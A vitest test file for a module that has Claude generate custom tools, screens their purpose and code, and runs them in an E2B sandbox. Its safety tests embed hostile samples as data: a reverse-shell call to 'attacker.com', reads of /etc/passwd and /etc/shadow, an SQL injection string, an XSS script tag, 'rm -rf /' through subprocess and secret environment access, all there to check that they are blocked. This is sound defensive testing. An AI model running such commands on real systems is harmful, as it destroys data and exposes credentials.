// @ts-nocheck - Test file with extensive mocking
/**
 * Comprehensive tests for dynamicTools.ts
 *
 * Covers:
 * - validateToolPurpose (purpose/intent validation)
 * - validateToolCode (code safety validation)
 * - generateDynamicTool (AI-powered tool generation)
 * - executeDynamicTool (sandbox execution)
 * - cleanupDynamicSandbox (sandbox lifecycle)
 * - registerDynamicTool / getDynamicTools / getDynamicToolById / clearDynamicTools (registry)
 * - getDynamicToolCreationDefinition (Claude tool schema)
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

// ---------------------------------------------------------------------------
// Mocks — MUST be declared before the module-under-test is imported
// ---------------------------------------------------------------------------

vi.mock('@/lib/logger', () => ({
  logger: () => ({ debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() }),
}));

// Mock the safety module with minimal real implementations needed for tests
const mockIsUrlSafe = vi.fn().mockReturnValue({ safe: true });
const mockSanitizeOutput = vi.fn((s: string) => s);
const mockCheckContentForWarnings = vi.fn().mockReturnValue({
  hasWarnings: false,
  keywords: [],
  requiresReview: false,
});
const mockLogBlockedAction = vi.fn();

vi.mock('../safety', () => ({
  isUrlSafe: (...args: unknown[]) => mockIsUrlSafe(...args),
  sanitizeOutput: (...args: unknown[]) => mockSanitizeOutput(...args),
  checkContentForWarnings: (...args: unknown[]) => mockCheckContentForWarnings(...args),
  logBlockedAction: (...args: unknown[]) => mockLogBlockedAction(...args),
  AI_SAFETY_PROMPT: 'MOCK_AI_SAFETY_PROMPT',
  BLOCKED_TLDS: ['.gov', '.mil', '.kp'],
  BLOCKED_DOMAINS: ['pornhub.com', 'rt.com'],
  ADULT_KEYWORDS: ['porn', 'xxx', 'nsfw'],
}));

// Mock Anthropic SDK
const mockCreate = vi.fn();
vi.mock('@anthropic-ai/sdk', () => {
  return {
    default: vi.fn().mockImplementation(() => ({
      messages: { create: mockCreate },
    })),
  };
});

// Mock E2B Sandbox
const mockRunCode = vi.fn();
const mockKill = vi.fn().mockResolvedValue(undefined);
const mockSandboxCreate = vi.fn().mockResolvedValue({
  runCode: mockRunCode,
  kill: mockKill,
});

vi.mock('@e2b/code-interpreter', () => ({
  Sandbox: {
    create: (...args: unknown[]) => mockSandboxCreate(...args),
  },
}));

// ---------------------------------------------------------------------------
// Import the module under test AFTER all mocks are defined
// ---------------------------------------------------------------------------

import {
  validateToolPurpose,
  validateToolCode,
  generateDynamicTool,
  executeDynamicTool,
  cleanupDynamicSandbox,
  registerDynamicTool,
  getDynamicTools,
  getDynamicToolById,
  clearDynamicTools,
  getDynamicToolCreationDefinition,
  DynamicToolRequest,
  DynamicToolDefinition,
} from '../dynamicTools';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeSafeRequest(overrides: Partial<DynamicToolRequest> = {}): DynamicToolRequest {
  return {
    purpose: 'Calculate compound interest for educational purposes',
    justification: 'Need custom math that the 13 tools do not provide',
    inputs: [
      { name: 'principal', type: 'number', description: 'Starting amount', required: true },
      { name: 'rate', type: 'number', description: 'Annual rate', required: true },
      { name: 'years', type: 'number', description: 'Number of years' },
    ],
    outputType: 'object',
    sessionId: 'test-session-123',
    ...overrides,
  };
}

function makeToolDef(overrides: Partial<DynamicToolDefinition> = {}): DynamicToolDefinition {
  return {
    id: 'dynamic_test_001',
    name: 'test_tool',
    description: 'A test tool',
    purpose: 'Testing',
    inputSchema: { type: 'object', properties: {} },
    code: 'def main(**kwargs): return {"result": 42}',
    language: 'python',
    approved: true,
    createdAt: Date.now(),
    usageCount: 0,
    safetyScore: 85,
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// Setup / Teardown
// ---------------------------------------------------------------------------

beforeEach(() => {
  vi.clearAllMocks();
  // Reset safety mocks to default safe state
  mockIsUrlSafe.mockReturnValue({ safe: true });
  mockSanitizeOutput.mockImplementation((s: string) => s);
  mockCheckContentForWarnings.mockReturnValue({
    hasWarnings: false,
    keywords: [],
    requiresReview: false,
  });
  // Clean up registry between tests
  clearDynamicTools('test-session-123');
  clearDynamicTools('session-a');
  clearDynamicTools('session-b');
});

afterEach(async () => {
  // Clean up any sandboxes that might have been created
  await cleanupDynamicSandbox();
});

// =============================================================================
// validateToolPurpose
// =============================================================================

describe('validateToolPurpose', () => {
  it('should approve a legitimate educational purpose', () => {
    const result = validateToolPurpose(makeSafeRequest());
    expect(result.safe).toBe(true);
  });

  it('should reject purpose containing hack-related keywords', () => {
    const result = validateToolPurpose(makeSafeRequest({ purpose: 'hack into a server' }));
    expect(result.safe).toBe(false);
    expect(result.severity).toBe('critical');
    expect(result.category).toBe('malicious_intent');
  });

  it('should reject purpose containing violence keywords', () => {
    const result = validateToolPurpose(makeSafeRequest({ purpose: 'build a weapon simulator' }));
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_intent');
  });

  it('should reject purpose containing drug keywords', () => {
    const result = validateToolPurpose(makeSafeRequest({ purpose: 'find cocaine suppliers' }));
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_intent');
  });

  it('should reject purpose containing adult keywords', () => {
    const result = validateToolPurpose(makeSafeRequest({ purpose: 'search for porn content' }));
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_intent');
  });

  it('should reject purpose containing surveillance keywords', () => {
    const result = validateToolPurpose(makeSafeRequest({ purpose: 'stalk a person online' }));
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_intent');
  });

  it('should reject purpose containing financial crime keywords', () => {
    const result = validateToolPurpose(
      makeSafeRequest({ purpose: 'create a ponzi scheme calculator' })
    );
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_intent');
  });

  it('should also check the justification field for dangerous patterns', () => {
    const result = validateToolPurpose(
      makeSafeRequest({
        purpose: 'simple calculator',
        justification: 'need to exploit a vulnerability',
      })
    );
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_intent');
  });

  it('should reject when content warnings require review', () => {
    mockCheckContentForWarnings.mockReturnValue({
      hasWarnings: true,
      keywords: ['terrorism', 'weapon'],
      requiresReview: true,
    });

    const result = validateToolPurpose(makeSafeRequest({ purpose: 'research topic' }));
    expect(result.safe).toBe(false);
    expect(result.severity).toBe('high');
    expect(result.category).toBe('suspicious_intent');
    expect(result.reason).toContain('warning keywords');
  });

  it('should pass when content warnings exist but do not require review', () => {
    mockCheckContentForWarnings.mockReturnValue({
      hasWarnings: true,
      keywords: ['some-keyword'],
      requiresReview: false,
    });

    const result = validateToolPurpose(makeSafeRequest());
    expect(result.safe).toBe(true);
  });
});

// =============================================================================
// validateToolCode
// =============================================================================

describe('validateToolCode', () => {
  it('should approve safe Python code', () => {
    const result = validateToolCode('def main(x): return x * 2', 'python');
    expect(result.safe).toBe(true);
  });

  it('should approve safe JavaScript code', () => {
    const result = validateToolCode('function main(x) { return x * 2; }', 'javascript');
    expect(result.safe).toBe(true);
  });

  it('should reject code containing eval()', () => {
    const result = validateToolCode('eval("malicious")', 'python');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_code');
  });

  it('should reject code containing exec()', () => {
    const result = validateToolCode('exec("import os; os.remove(f)")', 'python');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_code');
  });

  it('should reject code containing subprocess', () => {
    const result = validateToolCode('import subprocess; subprocess.run(["ls"])', 'python');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_code');
  });

  it('should reject code containing process.env', () => {
    const result = validateToolCode('const key = process.env.SECRET_KEY', 'javascript');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_code');
  });

  it('should reject code containing child_process', () => {
    const result = validateToolCode("require('child_process')", 'javascript');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_code');
  });

  it('should reject code containing crypto mining references', () => {
    const result = validateToolCode('start_mining_monero()', 'python');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_code');
  });

  it('should reject code containing reverse shell patterns', () => {
    const result = validateToolCode('connect_reverse_shell("attacker.com")', 'python');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_code');
  });

  it('should reject code containing SQL injection patterns', () => {
    const result = validateToolCode(
      "query = 'SELECT * FROM users UNION SELECT password FROM admin'",
      'python'
    );
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_code');
  });

  it('should reject code with <script> tags', () => {
    const result = validateToolCode('<script>alert("xss")</script>', 'javascript');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_code');
  });

  it('should reject code accessing /etc/passwd', () => {
    const result = validateToolCode('open("/etc/passwd")', 'python');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('malicious_code');
  });

  it('should reject code with blocked URLs', () => {
    mockIsUrlSafe.mockReturnValue({ safe: false, reason: 'Blocked domain' });
    // Use a URL that won't match DANGEROUS_CODE_PATTERNS (BLOCKED_TLDS/BLOCKED_DOMAINS)
    // but will be caught by the isUrlSafe check
    const code = 'result = fetch("https://some-blocked-custom-site.example/data")';
    const result = validateToolCode(code, 'python');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('blocked_url');
  });

  it('should allow code with safe URLs', () => {
    mockIsUrlSafe.mockReturnValue({ safe: true });
    const code = 'fetch("https://api.wikipedia.org/data")';
    const result = validateToolCode(code, 'javascript');
    expect(result.safe).toBe(true);
  });

  // Python-specific patterns
  it('should reject Python code with __import__', () => {
    const result = validateToolCode('__import__("os")', 'python');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('dangerous_python');
  });

  it('should reject Python code with importlib', () => {
    const result = validateToolCode('import importlib; importlib.import_module("os")', 'python');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('dangerous_python');
  });

  it('should reject Python code with globals()', () => {
    const result = validateToolCode('g = globals()', 'python');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('dangerous_python');
  });

  it('should reject Python code with open() on sensitive paths', () => {
    const result = validateToolCode('open("/etc/shadow")', 'python');
    // Could be caught by DANGEROUS_CODE_PATTERNS or python-specific check
    expect(result.safe).toBe(false);
  });

  it('should reject Python code with compile()', () => {
    const result = validateToolCode('compile("code", "file", "exec")', 'python');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('dangerous_python');
  });

  // JavaScript-specific patterns
  it('should reject JavaScript code with Function() constructor', () => {
    const result = validateToolCode('new Function("return this")()', 'javascript');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('dangerous_javascript');
  });

  it('should reject JavaScript code with require(fs)', () => {
    const result = validateToolCode("require('fs')", 'javascript');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('dangerous_javascript');
  });

  it('should reject JavaScript code with require(net)', () => {
    const result = validateToolCode("require('net')", 'javascript');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('dangerous_javascript');
  });

  it('should reject JavaScript code with global. access', () => {
    const result = validateToolCode('global.something = true', 'javascript');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('dangerous_javascript');
  });

  it('should reject JavaScript code with Buffer.from', () => {
    const result = validateToolCode('Buffer.from("data")', 'javascript');
    expect(result.safe).toBe(false);
    expect(result.category).toBe('dangerous_javascript');
  });

  it('should not apply Python-specific checks to JavaScript code', () => {
    // __import__ is only checked in Python context at the language-specific level,
    // but it is also caught by the general DANGEROUS_CODE_PATTERNS if it matches eval/exec
    // 'builtins' is a Python-specific check — should not trigger for JS
    // But the general patterns also match it. Let's use a clearly-JS-only-safe pattern
    const safeJs = 'function main(input) { return input.length; }';
    const result = validateToolCode(safeJs, 'javascript');
    expect(result.safe).toBe(true);
  });

  it('should handle code with no URLs gracefully', () => {
    const result = validateToolCode('x = 1 + 2', 'python');
    expect(result.safe).toBe(true);
    expect(mockIsUrlSafe).not.toHaveBeenCalled();
  });
});

// =============================================================================
// generateDynamicTool
// =============================================================================

describe('generateDynamicTool', () => {
  const mockAnthropicResponse = {
    content: [
      {
        type: 'text',
        text: JSON.stringify({
          name: 'compound_interest',
          description: 'Calculate compound interest',
          code: 'def main(principal, rate, years): return principal * (1 + rate) ** years',
          language: 'python',
          safe: true,
          safetyNotes: 'Pure math, no external access',
        }),
      },
    ],
  };

  beforeEach(() => {
    mockCreate.mockResolvedValue(mockAnthropicResponse);
  });

  it('should generate a tool for a safe request', async () => {
    const tool = await generateDynamicTool(makeSafeRequest());

    expect(tool).not.toBeNull();
    expect(tool!.name).toBe('compound_interest');
    expect(tool!.description).toBe('Calculate compound interest');
    expect(tool!.language).toBe('python');
    expect(tool!.approved).toBe(true);
    expect(tool!.usageCount).toBe(0);
    expect(tool!.safetyScore).toBe(85);
    expect(tool!.id).toMatch(/^dynamic_\d+_/);
  });

  it('should return null for a dangerous purpose', async () => {
    const tool = await generateDynamicTool(makeSafeRequest({ purpose: 'hack into a database' }));
    expect(tool).toBeNull();
    expect(mockCreate).not.toHaveBeenCalled();
  });

  it('should return null when Claude response has no JSON', async () => {
    mockCreate.mockResolvedValue({
      content: [{ type: 'text', text: 'Sorry, I cannot generate that tool.' }],
    });

    const tool = await generateDynamicTool(makeSafeRequest());
    expect(tool).toBeNull();
  });

  it('should return null when generated code fails safety check', async () => {
    mockCreate.mockResolvedValue({
      content: [
        {
          type: 'text',
          text: JSON.stringify({
            name: 'dangerous_tool',
            description: 'A tool',
            code: 'import subprocess; subprocess.run(["rm", "-rf", "/"])',
            language: 'python',
            safe: true,
            safetyNotes: 'Looks fine',
          }),
        },
      ],
    });

    const tool = await generateDynamicTool(makeSafeRequest());
    expect(tool).toBeNull();
    expect(mockLogBlockedAction).toHaveBeenCalled();
  });

  it('should return null when Claude flags code as unsafe', async () => {
    mockCreate.mockResolvedValue({
      content: [
        {
          type: 'text',
          text: JSON.stringify({
            name: 'risky_tool',
            description: 'A risky tool',
            code: 'def main(): return 42',
            language: 'python',
            safe: false,
            safetyNotes: 'This could be risky',
          }),
        },
      ],
    });

    const tool = await generateDynamicTool(makeSafeRequest());
    expect(tool).toBeNull();
  });

  it('should return null when API call throws an error', async () => {
    mockCreate.mockRejectedValue(new Error('API timeout'));

    const tool = await generateDynamicTool(makeSafeRequest());
    expect(tool).toBeNull();
  });

  it('should return null when API call throws a non-Error', async () => {
    mockCreate.mockRejectedValue('network failure string');

    const tool = await generateDynamicTool(makeSafeRequest());
    expect(tool).toBeNull();
  });

  it('should build correct inputSchema with required fields', async () => {
    const tool = await generateDynamicTool(makeSafeRequest());

    expect(tool).not.toBeNull();
    const schema = tool!.inputSchema as {
      type: string;
      properties: Record<string, unknown>;
      required: string[];
    };
    expect(schema.type).toBe('object');
    expect(schema.properties).toHaveProperty('principal');
    expect(schema.properties).toHaveProperty('rate');
    expect(schema.properties).toHaveProperty('years');
    // Only principal and rate are required
    expect(schema.required).toEqual(['principal', 'rate']);
  });

  it('should include approach in user prompt when provided', async () => {
    await generateDynamicTool(makeSafeRequest({ approach: 'Use the formula A = P(1 + r/n)^(nt)' }));

    expect(mockCreate).toHaveBeenCalledTimes(1);
    const callArgs = mockCreate.mock.calls[0][0];
    const userMessage = callArgs.messages[0].content;
    expect(userMessage).toContain('Use the formula');
  });

  it('should handle response with multiple content blocks', async () => {
    mockCreate.mockResolvedValue({
      content: [
        { type: 'text', text: 'Here is the tool:\n' },
        {
          type: 'text',
          text: JSON.stringify({
            name: 'multi_block_tool',
            description: 'Multi block',
            code: 'def main(): return 1',
            language: 'python',
            safe: true,
            safetyNotes: 'safe',
          }),
        },
      ],
    });

    const tool = await generateDynamicTool(makeSafeRequest());
    expect(tool).not.toBeNull();
    expect(tool!.name).toBe('multi_block_tool');
  });

  it('should filter out non-text content blocks', async () => {
    mockCreate.mockResolvedValue({
      content: [
        { type: 'tool_use', id: 'tu_1', name: 'something', input: {} },
        {
          type: 'text',
          text: JSON.stringify({
            name: 'filtered_tool',
            description: 'Filtered',
            code: 'def main(): return 1',
            language: 'python',
            safe: true,
            safetyNotes: 'safe',
          }),
        },
      ],
    });

    const tool = await generateDynamicTool(makeSafeRequest());
    expect(tool).not.toBeNull();
    expect(tool!.name).toBe('filtered_tool');
  });
});

// =============================================================================
// executeDynamicTool
// =============================================================================

describe('executeDynamicTool', () => {
  const sessionId = 'exec-session-1';

  beforeEach(() => {
    mockSandboxCreate.mockResolvedValue({
      runCode: mockRunCode,
      kill: mockKill,
    });
  });

  afterEach(async () => {
    await cleanupDynamicSandbox(sessionId);
  });

  it('should execute a Python tool and return parsed result', async () => {
    mockRunCode.mockResolvedValue({
      logs: {
        stdout: ['{"success": true, "result": 42}'],
        stderr: [],
      },
    });

    const tool = makeToolDef({ language: 'python' });
    const result = await executeDynamicTool(tool, { x: 10 }, sessionId);

    expect(result.success).toBe(true);
    expect(result.output).toBe(42);
    expect(result.sanitized).toBe(false); // result is a number, not a string
    expect(result.executionTimeMs).toBeGreaterThanOrEqual(0);
  });

  it('should execute a JavaScript tool', async () => {
    mockRunCode.mockResolvedValue({
      logs: {
        stdout: ['{"success": true, "result": "hello"}'],
        stderr: [],
      },
    });

    const tool = makeToolDef({
      language: 'javascript',
      code: 'async function main(inputs) { return "hello"; }',
    });
    const result = await executeDynamicTool(tool, {}, sessionId);

    expect(result.success).toBe(true);
    expect(result.output).toBe('hello');
    expect(result.sanitized).toBe(true); // result is a string
    expect(mockSanitizeOutput).toHaveBeenCalledWith('hello');
  });

  it('should sanitize string output', async () => {
    mockSanitizeOutput.mockReturnValue('[SANITIZED]');
    mockRunCode.mockResolvedValue({
      logs: {
        stdout: ['{"success": true, "result": "sensitive data"}'],
        stderr: [],
      },
    });

    const tool = makeToolDef();
    const result = await executeDynamicTool(tool, {}, sessionId);

    expect(result.output).toBe('[SANITIZED]');
    expect(result.sanitized).toBe(true);
  });

  it('should block inputs containing dangerous patterns', async () => {
    const tool = makeToolDef();
    const result = await executeDynamicTool(tool, { cmd: 'eval("malicious")' }, sessionId);

    expect(result.success).toBe(false);
    expect(result.error).toBe('Input contains blocked patterns');
    expect(mockLogBlockedAction).toHaveBeenCalled();
    expect(mockRunCode).not.toHaveBeenCalled();
  });

  it('should block inputs containing process.env', async () => {
    const tool = makeToolDef();
    const result = await executeDynamicTool(tool, { data: 'process.env.SECRET' }, sessionId);

    expect(result.success).toBe(false);
    expect(result.error).toBe('Input contains blocked patterns');
  });

  it('should handle sandbox execution errors gracefully', async () => {
    mockSandboxCreate.mockRejectedValue(new Error('E2B sandbox unavailable'));

    const tool = makeToolDef();
    const result = await executeDynamicTool(tool, { x: 1 }, 'error-session');

    expect(result.success).toBe(false);
    expect(result.error).toBe('E2B sandbox unavailable');
    expect(result.sanitized).toBe(false);

    // Clean up
    await cleanupDynamicSandbox('error-session');
  });

  it('should handle non-Error sandbox exceptions', async () => {
    mockSandboxCreate.mockRejectedValue('string error');

    const tool = makeToolDef();
    const result = await executeDynamicTool(tool, {}, 'str-error-session');

    expect(result.success).toBe(false);
    expect(result.error).toBe('string error');

    await cleanupDynamicSandbox('str-error-session');
  });

  it('should handle non-JSON stdout by returning sanitized raw output', async () => {
    mockRunCode.mockResolvedValue({
      logs: {
        stdout: ['This is not JSON output'],
        stderr: [],
      },
    });
    mockSanitizeOutput.mockReturnValue('This is not JSON output');

    const tool = makeToolDef();
    const result = await executeDynamicTool(tool, {}, sessionId);

    expect(result.success).toBe(true);
    expect(result.output).toBe('This is not JSON output');
    expect(result.sanitized).toBe(true);
  });

  it('should log warnings when stderr is present', async () => {
    mockRunCode.mockResolvedValue({
      logs: {
        stdout: ['{"success": true, "result": 1}'],
        stderr: ['DeprecationWarning: something is deprecated'],
      },
    });

    const tool = makeToolDef();
    await executeDynamicTool(tool, {}, sessionId);

    // The test passes if no error is thrown — stderr is logged but not fatal
    expect(true).toBe(true);
  });

  it('should update tool usage stats after successful execution', async () => {
    mockRunCode.mockResolvedValue({
      logs: {
        stdout: ['{"success": true, "result": 100}'],
        stderr: [],
      },
    });

    const tool = makeToolDef();
    expect(tool.usageCount).toBe(0);
    expect(tool.lastUsed).toBeUndefined();

    await executeDynamicTool(tool, {}, sessionId);

    expect(tool.usageCount).toBe(1);
    expect(tool.lastUsed).toBeDefined();
    expect(typeof tool.lastUsed).toBe('number');
  });

  it('should reuse sandbox for the same session', async () => {
    mockRunCode.mockResolvedValue({
      logs: {
        stdout: ['{"success": true, "result": 1}'],
        stderr: [],
      },
    });

    const tool = makeToolDef();
    await executeDynamicTool(tool, {}, sessionId);
    await executeDynamicTool(tool, {}, sessionId);

    // Sandbox.create should only be called once for the same session
    expect(mockSandboxCreate).toHaveBeenCalledTimes(1);
  });

  it('should handle the tool result with success false from sandbox', async () => {
    mockRunCode.mockResolvedValue({
      logs: {
        stdout: ['{"success": false, "error": "Division by zero"}'],
        stderr: [],
      },
    });

    const tool = makeToolDef();
    const result = await executeDynamicTool(tool, {}, sessionId);

    expect(result.success).toBe(false);
    expect(result.error).toBe('Division by zero');
  });

  it('should parse the last line of multi-line stdout as JSON', async () => {
    mockRunCode.mockResolvedValue({
      logs: {
        stdout: ['Some debug output', 'More debug', '{"success": true, "result": "final"}'],
        stderr: [],
      },
    });

    const tool = makeToolDef();
    const result = await executeDynamicTool(tool, {}, sessionId);

    expect(result.success).toBe(true);
    expect(result.output).toBe('final');
  });
});

// =============================================================================
// cleanupDynamicSandbox
// =============================================================================

describe('cleanupDynamicSandbox', () => {
  it('should cleanup a specific session sandbox', async () => {
    const sid = 'cleanup-session-1';
    // First create a sandbox by executing a tool
    mockRunCode.mockResolvedValue({
      logs: { stdout: ['{"success": true, "result": 1}'], stderr: [] },
    });
    mockSandboxCreate.mockResolvedValue({ runCode: mockRunCode, kill: mockKill });

    const tool = makeToolDef();
    await executeDynamicTool(tool, {}, sid);

    // Now cleanup
    await cleanupDynamicSandbox(sid);
    expect(mockKill).toHaveBeenCalled();
  });

  it('should handle cleanup when session does not exist', async () => {
    // Should not throw
    await cleanupDynamicSandbox('nonexistent-session');
    expect(mockKill).not.toHaveBeenCalled();
  });

  it('should cleanup all sandboxes when no sessionId is provided', async () => {
    mockRunCode.mockResolvedValue({
      logs: { stdout: ['{"success": true, "result": 1}'], stderr: [] },
    });
    const sandbox1 = { runCode: mockRunCode, kill: vi.fn().mockResolvedValue(undefined) };
    const sandbox2 = { runCode: mockRunCode, kill: vi.fn().mockResolvedValue(undefined) };
    mockSandboxCreate.mockResolvedValueOnce(sandbox1).mockResolvedValueOnce(sandbox2);

    const tool = makeToolDef();
    await executeDynamicTool(tool, {}, 'cleanup-all-1');
    await executeDynamicTool(tool, {}, 'cleanup-all-2');

    await cleanupDynamicSandbox();
    expect(sandbox1.kill).toHaveBeenCalled();
    expect(sandbox2.kill).toHaveBeenCalled();
  });

  it('should handle kill errors gracefully during cleanup', async () => {
    mockRunCode.mockResolvedValue({
      logs: { stdout: ['{"success": true, "result": 1}'], stderr: [] },
    });
    const failingSandbox = {
      runCode: mockRunCode,
      kill: vi.fn().mockRejectedValue(new Error('kill failed')),
    };
    mockSandboxCreate.mockResolvedValue(failingSandbox);

    const tool = makeToolDef();
    await executeDynamicTool(tool, {}, 'failing-cleanup');

    // Should not throw even though kill fails
    await cleanupDynamicSandbox('failing-cleanup');
    expect(failingSandbox.kill).toHaveBeenCalled();
  });

  it('should handle kill errors gracefully during cleanup-all', async () => {
    mockRunCode.mockResolvedValue({
      logs: { stdout: ['{"success": true, "result": 1}'], stderr: [] },
    });
    const failingSandbox = {
      runCode: mockRunCode,
      kill: vi.fn().mockRejectedValue(new Error('kill failed')),
    };
    mockSandboxCreate.mockResolvedValue(failingSandbox);

    const tool = makeToolDef();
    await executeDynamicTool(tool, {}, 'failing-cleanup-all');

    // Should not throw
    await cleanupDynamicSandbox();
    expect(failingSandbox.kill).toHaveBeenCalled();
  });
});

// =============================================================================
// Dynamic Tool Registry
// =============================================================================

describe('registerDynamicTool', () => {
  it('should register a tool for a session', () => {
    const tool = makeToolDef({ id: 'reg-tool-1' });
    registerDynamicTool('session-a', tool);

    const tools = getDynamicTools('session-a');
    expect(tools).toHaveLength(1);
    expect(tools[0].id).toBe('reg-tool-1');
  });

  it('should register multiple tools for the same session', () => {
    registerDynamicTool('session-a', makeToolDef({ id: 'reg-tool-1' }));
    registerDynamicTool('session-a', makeToolDef({ id: 'reg-tool-2' }));

    const tools = getDynamicTools('session-a');
    expect(tools).toHaveLength(2);
  });

  it('should keep tools separate between sessions', () => {
    registerDynamicTool('session-a', makeToolDef({ id: 'tool-a' }));
    registerDynamicTool('session-b', makeToolDef({ id: 'tool-b' }));

    expect(getDynamicTools('session-a')).toHaveLength(1);
    expect(getDynamicTools('session-b')).toHaveLength(1);
    expect(getDynamicTools('session-a')[0].id).toBe('tool-a');
    expect(getDynamicTools('session-b')[0].id).toBe('tool-b');
  });
});

describe('getDynamicTools', () => {
  it('should return empty array for unknown session', () => {
    const tools = getDynamicTools('unknown-session');
    expect(tools).toEqual([]);
  });

  it('should return all tools for a session', () => {
    registerDynamicTool('session-a', makeToolDef({ id: 't1' }));
    registerDynamicTool('session-a', makeToolDef({ id: 't2' }));
    registerDynamicTool('session-a', makeToolDef({ id: 't3' }));

    expect(getDynamicTools('session-a')).toHaveLength(3);
  });
});

describe('getDynamicToolById', () => {
  it('should find a tool by ID', () => {
    registerDynamicTool('session-a', makeToolDef({ id: 'find-me' }));
    registerDynamicTool('session-a', makeToolDef({ id: 'other' }));

    const found = getDynamicToolById('session-a', 'find-me');
    expect(found).toBeDefined();
    expect(found!.id).toBe('find-me');
  });

  it('should return undefined for non-existent tool ID', () => {
    registerDynamicTool('session-a', makeToolDef({ id: 'existing' }));
    const found = getDynamicToolById('session-a', 'nonexistent');
    expect(found).toBeUndefined();
  });

  it('should return undefined for non-existent session', () => {
    const found = getDynamicToolById('no-such-session', 'any-id');
    expect(found).toBeUndefined();
  });
});

describe('clearDynamicTools', () => {
  it('should clear all tools for a session', () => {
    registerDynamicTool('session-a', makeToolDef({ id: 'x1' }));
    registerDynamicTool('session-a', makeToolDef({ id: 'x2' }));

    clearDynamicTools('session-a');
    expect(getDynamicTools('session-a')).toEqual([]);
  });

  it('should not affect other sessions', () => {
    registerDynamicTool('session-a', makeToolDef({ id: 'a1' }));
    registerDynamicTool('session-b', makeToolDef({ id: 'b1' }));

    clearDynamicTools('session-a');
    expect(getDynamicTools('session-a')).toEqual([]);
    expect(getDynamicTools('session-b')).toHaveLength(1);
  });

  it('should handle clearing a non-existent session without error', () => {
    expect(() => clearDynamicTools('nope')).not.toThrow();
  });
});

// =============================================================================
// getDynamicToolCreationDefinition
// =============================================================================

describe('getDynamicToolCreationDefinition', () => {
  it('should return a valid tool definition', () => {
    const def = getDynamicToolCreationDefinition();

    expect(def.name).toBe('create_custom_tool');
    expect(def.description).toContain('custom tool');
    expect(def.input_schema).toBeDefined();
  });

  it('should have required fields in the input schema', () => {
    const def = getDynamicToolCreationDefinition();
    const schema = def.input_schema as {
      type: string;
      properties: Record<string, unknown>;
      required: string[];
    };

    expect(schema.type).toBe('object');
    expect(schema.required).toContain('purpose');
    expect(schema.required).toContain('justification');
    expect(schema.required).toContain('inputs');
    expect(schema.required).toContain('outputType');
  });

  it('should have approach as an optional field', () => {
    const def = getDynamicToolCreationDefinition();
    const schema = def.input_schema as {
      type: string;
      properties: Record<string, unknown>;
      required: string[];
    };

    expect(schema.properties).toHaveProperty('approach');
    expect(schema.required).not.toContain('approach');
  });

  it('should describe supported output types', () => {
    const def = getDynamicToolCreationDefinition();
    const schema = def.input_schema as {
      properties: {
        outputType: { enum: string[] };
      };
    };

    expect(schema.properties.outputType.enum).toEqual(
      expect.arrayContaining(['string', 'number', 'boolean', 'array', 'object', 'mixed'])
    );
  });

  it('should describe supported input types', () => {
    const def = getDynamicToolCreationDefinition();
    const schema = def.input_schema as {
      properties: {
        inputs: {
          items: {
            properties: {
              type: { enum: string[] };
            };
          };
        };
      };
    };

    expect(schema.properties.inputs.items.properties.type.enum).toEqual(
      expect.arrayContaining(['string', 'number', 'boolean', 'array', 'object'])
    );
  });
});
